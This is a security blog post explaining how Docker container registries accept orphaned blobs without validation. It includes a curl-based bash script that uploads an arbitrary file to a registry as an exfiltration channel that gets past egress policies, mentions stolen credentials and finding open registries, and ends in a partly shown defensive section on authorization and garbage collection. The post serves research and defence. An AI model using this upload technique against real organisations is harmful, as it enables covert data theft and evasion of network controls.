<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="How To Abuse Container Repositories For Fun And Profit" /><meta property="og:locale" content="en" /><meta name="description" content="Often as security engineers we are worried about what vulnerabilites can be downloaded from container registries, howver i believe the same could be used to exfiltrate data." /><meta property="og:description" content="Often as security engineers we are worried about what vulnerabilites can be downloaded from container registries, howver i believe the same could be used to exfiltrate data." /><link rel="canonical" href="https://tamalerhino.github.io/posts/how-to-abuse-container-repositories-for-fun-and-profit/" /><meta property="og:url" content="https://tamalerhino.github.io/posts/how-to-abuse-container-repositories-for-fun-and-profit/" /><meta property="og:site_name" content="Tamalerhino’s Blog" /><meta property="og:image" content="https://tamalerhino.github.io/pexels-anete-lusina-5240543.jpg" /><meta property="og:image:height" content="800" /><meta property="og:image:width" content="1000" /><meta property="og:image:alt" content="hacking" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-23T12:00:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://tamalerhino.github.io/pexels-anete-lusina-5240543.jpg" /><meta name="twitter:image:alt" content="hacking" /><meta property="twitter:title" content="How To Abuse Container Repositories For Fun And Profit" /><meta name="twitter:site" content="@tamalerhino" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-07-10T22:28:50-05:00","datePublished":"2021-10-23T12:00:00-05:00","description":"Often as security engineers we are worried about what vulnerabilites can be downloaded from container registries, howver i believe the same could be used to exfiltrate data.","headline":"How To Abuse Container Repositories For Fun And Profit","image":{"width":1000,"height":800,"alt":"hacking","url":"https://tamalerhino.github.io/pexels-anete-lusina-5240543.jpg","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://tamalerhino.github.io/posts/how-to-abuse-container-repositories-for-fun-and-profit/"},"url":"https://tamalerhino.github.io/posts/how-to-abuse-container-repositories-for-fun-and-profit/"}</script><title>How To Abuse Container Repositories For Fun And Profit | Tamalerhino's Blog</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tamalerhino's Blog"><meta name="application-name" content="Tamalerhino's Blog"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/tamalerhino2-1mb.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Tamalerhino's Blog</a></div><div class="site-subtitle font-italic">Just one rhino's thoughts.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/tamalerhino" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/tamalerhino" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/ulises-galeano/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>How To Abuse Container Repositories For Fun And Profit</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>How To Abuse Container Repositories For Fun And Profit</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1635008400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 23, 2021 </em> </span> <span> Updated <em class="" data-ts="1657510130" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 10, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 800'%3E%3C/svg%3E" data-src="/assets/img/posts/pexels-anete-lusina-5240543.jpg" class="preview-img bg" alt="hacking" width="1000" height="800" data-proofer-ignore><figcaption class="pt-2 pb-2">hacking</figcaption></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/tamalerhino">Ulises Galeano</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2295 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><p>Often as security engineers we are worried about what vulnerabilites can be downloaded from container registries, howver i believe the same could be used to exfiltrate data.</p><p>We will go over what a container repository(sometimes referred to as a registry) is, the mechanisms and APIs used to communicate with them, and ultimately how to abuse the features to make a malicious file appear like a legitimate image layer to exfiltrate data.</p><h1 id="what-is-a-container-repository">What is a Container Repository?</h1><p>A container repository is a software component used to store and access container images. A container registry is a collection of container repositories, including mechanisms like authentication, authorization, and storage management. This can be simplified as a binary blob storage system with an API Frontend. It has two main processes, receiving a blob and receiving a manifest file that points to that blob. Because these processes are independent of each other you can use one or the other or both at the same time.</p><p>Therein lies the first issue, because these are independent processes the registry itself does not inherently know if a blob matches to a manifest or is orphaned. That means there can be a blob ( docker container layer) that was uploaded that has no matching manifest pointing to it and will just sit there in the repo until something comes along and removes it or points to it.</p><p>This means you can secretly use a container repository as a generic blob store, without your files ever showing up as a registry object.</p><p>Why would you do this and how? Well, it could lead to some cool projects such as a <a href="https://twitter.com/hasheddan/status/1448783583523393536">container repository backed IRC server</a> handled by a docker image as the client and the repo as the server, each layer being the newer messages being pushed and pulled down. And we can see other use cases such as using <a href="https://github.com/coollog/rocker">this tool</a> based on the features below to store any sort of file in a repo.</p><h2 id="blob-storageobject-storage"><span class="mr-2">Blob Storage(object storage).</span><a href="#blob-storageobject-storage" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Blob storage is really just a generic Object Storage solution but has been optimized and is ideal for storing massive amounts of unstructured data. Unstructured data is data that doesn’t adhere to a particular data model or definition, such as text or binary data.</p><h2 id="manifests"><span class="mr-2">Manifests</span><a href="#manifests" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A container manifest or an image manifest is a file that contains information about an image. Such as the layers, size, and digest of that image.</p><p>Docker has built-in commands such as “docker manifest” and “docker manifest inspect” that can help manage and inspect the contents of that manifest file. To make matters worse there are two versions of a docker container manifest schema, as well as a third option called a manifest list, which is like a manifest but it includes several different manifests of other images. <a href="https://docs.docker.com/registry/spec/manifest-v2-2/">More info here</a></p><details> <summary>Manifest V2 Example</summary><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="w">  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"schemaVersion"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w">
    </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.distribution.manifest.v2+json"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"config"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.container.image.v1+json"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">7023</span><span class="p">,</span><span class="w">
        </span><span class="nl">"digest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:b5b2b2c507a0944348e0303114d8d93aaaa081732b86451d9bce1f432a537bc7"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"layers"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.image.rootfs.diff.tar.gzip"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">32654</span><span class="p">,</span><span class="w">
            </span><span class="nl">"digest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:e692418e4cbaf90ca69d05a66403747baa33ee08806650b51fab815ad7fc331f"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.image.rootfs.diff.tar.gzip"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">16724</span><span class="p">,</span><span class="w">
            </span><span class="nl">"digest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:3c3a4604a545cdc127456d94e421cd355bca5b528f4a9c1905b15da2eb4a4c6b"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.image.rootfs.diff.tar.gzip"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">73109</span><span class="p">,</span><span class="w">
            </span><span class="nl">"digest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:ec4b8955958665577945c89419d1af06b5f7636b4ac3da7f12184802ad867736"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span></code></pre></figure></details> <details> <summary>Manifest List Example</summary><figure class="highlight"><pre><code class="language-json" data-lang="json"><span class="p">{</span><span class="w">
  </span><span class="nl">"schemaVersion"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w">
  </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.distribution.manifest.list.v2+json"</span><span class="p">,</span><span class="w">
  </span><span class="nl">"manifests"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.distribution.manifest.v2+json"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">7143</span><span class="p">,</span><span class="w">
      </span><span class="nl">"digest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:e692418e4cbaf90ca69d05a66403747baa33ee08806650b51fab815ad7fc331f"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"platform"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"architecture"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ppc64le"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"os"</span><span class="p">:</span><span class="w"> </span><span class="s2">"linux"</span><span class="p">,</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"mediaType"</span><span class="p">:</span><span class="w"> </span><span class="s2">"application/vnd.docker.distribution.manifest.v2+json"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"size"</span><span class="p">:</span><span class="w"> </span><span class="mi">7682</span><span class="p">,</span><span class="w">
      </span><span class="nl">"digest"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sha256:5b0bcabd1ed22e9fb1310cf6c2dec7cdef19f0ad69efa1f392e94a4333501270"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"platform"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"architecture"</span><span class="p">:</span><span class="w"> </span><span class="s2">"amd64"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"os"</span><span class="p">:</span><span class="w"> </span><span class="s2">"linux"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"features"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
          </span><span class="s2">"sse4"</span><span class="w">
        </span><span class="p">]</span><span class="w">
      </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span></code></pre></figure></details><h1 id="how-to-abuse-a-docker-repository-to-exfiltrate-data">How to abuse a docker repository to exfiltrate data.</h1><p>So, how can we use the above knowledge to abuse the configuration?</p><p>First, let’s assume that you have write-access to the repository, and while having to write access to the repository opens you up to other attacks such as the ability to overwrite images, or a backdoor to trusted images, etc the scope will be tricking the manifest to make a malicious layer or file appear as a legitimate layer of the image.</p><p>Also, container repositories are not protected by default, taking a look at a tool like <a href="https://shodan.io/">Shodan</a> or googling for possible docker repositories will show many results for unprotected registries.</p><p>So let’s start by using the repo itself as an exfiltration channel, given that many network tools are not able to scan for blobs or generic binary files you can actually use the docker repository to exfiltrate data. And secondly by take a look at the repo as arbitrary blog storage in order for you to deliver your malware across an entire organization.</p><p>In this case, let’s assume there is a network egress policy preventing from phoning home or sending data out of the org. Many organizations do however put container registries into their allow-lists. Because these are public-facing across several environments you should be able to upload data to the registry and then download it at a different location using your credentials or stolen credentials.</p><h1 id="how-to-make-a-malicious-file-appear-like-a-legitimate-image-layer">How to make a malicious file appear like a legitimate image layer.</h1><p>First let’s take a look at what the directory structure looks like for a docker repository on the filesystem, below is an example of a docker repository I made following <a href="https://docs.docker.com/registry/deploying/">these</a> instructions. As an FYI I used the local storage option but there are many <a href="https://docs.docker.com/registry/configuration/#storage">others</a> to choose from S3, swift,gcs, and azure’s blob storage to name a few.</p><p>This is what the repo looks like with just one image for simplicity, the more images the more blobs and repos there will be.</p><details> <summary>Docker Registry Directory Structure for Ubuntu</summary><figure class="highlight"><pre><code class="language-bash" data-lang="bash">/var/lib/registry/docker/registry/v2 <span class="c"># ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/' #yes this looks ugly but i didnt have `tree` installed</span>
   <span class="nb">.</span>
   |-blobs
   |---sha256
   |-----58
   |-------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |-----a3
   |-------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----b5
   |-------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |-----b6
   |-------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |-----da
   |-------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |-----fb
   |-------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |-repositories
   |---my-ubuntu
   |-----_layers
   |-------sha256
   |---------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |---------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |---------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |---------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |---------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |-----_manifests
   |-------revisions
   |---------sha256
   |-----------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-------tags
   |---------latest
   |-----------current
   |-----------index
   |-------------sha256
   |---------------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----_uploads</code></pre></figure></details><p>Here we can see the blobs directory, currently hosting Docker Image layers, however, keep in mind it could be absolutely any type of file. Then we have the Repositories folder which contains metadata and link references to the blobs.</p><p>HOWEVER! there is no validation of any kind, the repository itself does not compare the image manifest to the blobs located in the blobs directory, and even though the docker image layers are all zip’ed files, it doesn’t even verify the file format either. There is no input validation, header validation, or file type validation, nothing.</p><p>You could tell the docker registry API to upload any type of binary. As we’re about to see below. (Although there are great tools out there for working with remote image registries such as <a href="https://github.com/containers/skopeo">Skopeo</a>, were just going to curl it directly that way we can run anywhere without any dependencies which makes it a perfect candidate for running on a vulnerable host.)</p><p>First, let’s take a look at what the <a href="https://docs.docker.com/registry/spec/api/#blob-upload">documentation</a> says we need here:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>PUT /v2/&lt;name&gt;/blobs/uploads/&lt;uuid&gt;?digest<span class="o">=</span>&lt;digest&gt;
Content-Length: &lt;size of your content&gt;
Content-Type: application/octet-stream
 
&lt;your binary blob&gt;
</pre></table></code></div></div><p>In order to recreate this, I wrote a bash script that would do this for me, this assumes you have a file locally called “ulises_superbad_file.txt” feel free to rename this to whatever file you want to upload.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>user@docker-registry ~]<span class="nv">$ </span><span class="nb">cat </span>ulises_superbad_file.txt
TONS OF BAD STUFF IN HERE
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c">#! /bin/bash</span>
<span class="nv">reponame</span><span class="o">=</span>my-ubuntu
<span class="nv">uploadURL</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-siL</span> <span class="nt">-X</span> POST <span class="s2">"10.0.1.68:5000/v2/</span><span class="nv">$reponame</span><span class="s2">/blobs/uploads/"</span> | <span class="nb">grep</span> <span class="s1">'Location:'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f</span> 2 | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[:space:]'</span><span class="si">)</span>
<span class="nv">blobDigest</span><span class="o">=</span><span class="s2">"sha256:</span><span class="si">$(</span><span class="nb">sha256sum </span>ulises_superbad_file.txt | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">' '</span> <span class="nt">-f</span> 1<span class="si">)</span><span class="s2">"</span>
curl <span class="nt">-T</span> ulises_superbad_file.txt <span class="nt">--progress-bar</span> <span class="s2">"</span><span class="nv">$uploadURL</span><span class="s2">&amp;digest=</span><span class="nv">$blobDigest</span><span class="s2">"</span> <span class="o">&gt;</span> /dev/null
</pre></table></code></div></div><p>After running it we can see that there is a new layer in blobs!</p><details> <summary>Docker Registry Directory Structure for Ubuntu showing the new layer</summary><figure class="highlight"><pre><code class="language-bash" data-lang="bash">  /var/lib/registry/docker/registry/v2 <span class="c"># ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/   /' -e 's/-/|/'</span>
   <span class="nb">.</span>
   |-blobs
   |---sha256
   |-----46
   |-------4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf  <span class="c"># &lt;---- OUR BAD LAYER!!!</span>
   |-----58
   |-------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |-----a3
   |-------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----b5
   |-------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |-----b6
   |-------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |-----da
   |-------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |-----fb
   |-------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |---uploads
   |-repositories
   |---my-ubuntu
   |-----_layers
   |-------sha256
   |---------4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf
   |---------58690f9b18fca6469a14da4e212c96849469f9b1be6661d2342a4bf01774aa50
   |---------b51569e7c50720acf6860327847fe342a1afbe148d24c529fb81df105e3eed01
   |---------b6f50765242581c887ff1acc2511fa2d885c52d8fb3ac8c4bba131fd86567f2e
   |---------da8ef40b9ecabc2679fe2419957220c0272a965c5cf7e0269fa1aeeb8c56f2e1
   |---------fb15d46c38dcd1ea0b1990006c3366ecd10c79d374f341687eb2cb23a2c8672e
   |-----_manifests
   |-------revisions
   |---------sha256
   |-----------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-------tags
   |---------latest
   |-----------current
   |-----------index
   |-------------sha256
   |---------------a3785f78ab8547ae2710c89e627783cfa7ee7824d3468cae6835c9f4eae23ff7
   |-----_uploads
   |-------69c54205-5f65-4319-8f73-ae3868970f75
   |---------hashstates
   |-----------sha256
   |-------b3e5b11b-a3aa-4cd4-8730-4ae9b11cc4e4
   |---------hashstates
   |-----------sha256
   |-------e7adae40-331d-4532-8c35-516a8a5f698e
   |---------hashstates
   |-----------sha256
   </code></pre></figure></details><p>Catting out that file will show that we have successfully exfiltrated using the docker registry API! And as you can see we did not overwrite any layer or repo, just adding to where the blob gets stored.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>/var/lib/registry/docker/registry/v2 <span class="c"># cat blobs/sha256/46/4663e1a25d7f857db2dc2d18269aab7f2ca5ed1f482525de9e68ef14dc097dbf/data</span>
TONS OF BAD STUFF IN HERE
</pre></table></code></div></div><p>In the above example, I put it into my my-ubuntu repo, ideally, you could replace this with any repo name, the more common the better.</p><p>To find out what repos exists just run the following and you will get back the list of repositories in the registry.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">[</span>user@docker-registry ~]<span class="nv">$ </span>curl <span class="nt">-X</span> GET 10.0.1.68:5000/v2/_catalog
<span class="o">{</span><span class="s2">"repositories"</span>:[<span class="s2">"my-ubuntu"</span><span class="o">]}</span>
</pre></table></code></div></div><h1 id="defending-against-the-dark-arts">Defending Against the Dark Arts</h1><p>So how can we defend against this type of attack? It starts with proper authorization, this type of attack is only possible because the user would have access to write to any repo in the registry.</p><p>However, there are two main things we can do to defend against this if our authorization controls were to fail.</p><h2 id="garbage-collection"><span class="mr-2">Garbage Collection</span><a href="#garbage-collection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><a href="https://docs.docker.com/registry/garbage-collection/">Garbage collection</a> is the biggest control we can add here. What garbage collection does is, remove blobs from the filesystem when they are no longer referenced by a manifest. As of v2.4.0, a garbage collector command is included within the registry binary. Garbage collection runs in two phases. First, in the ‘mark’ phase, the process scans all the manifests in the registry. From these manifests, it constructs a set of content address digests. This set is the ‘mark set’ and denotes the set of blobs to not delete. Secondly, in the ‘sweep’ phase, the process scans all the blobs and if a blob’s content address digest is not in the mark set, the process deletes it. One caveat with this is that you should ensure that the registry is in read-only mode or not running at all. If you were to upload an image while garbage collection is running, there is the risk that the image’s layers are mistakenly deleted leading to a corrupted image.</p><p>To run the garbage collection binary, you would run it as follows(ideally in some sort of cron or automated way), the dry-run option can be used to see what will be deleted. And you will need a yml file that tells it what registry to look into.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
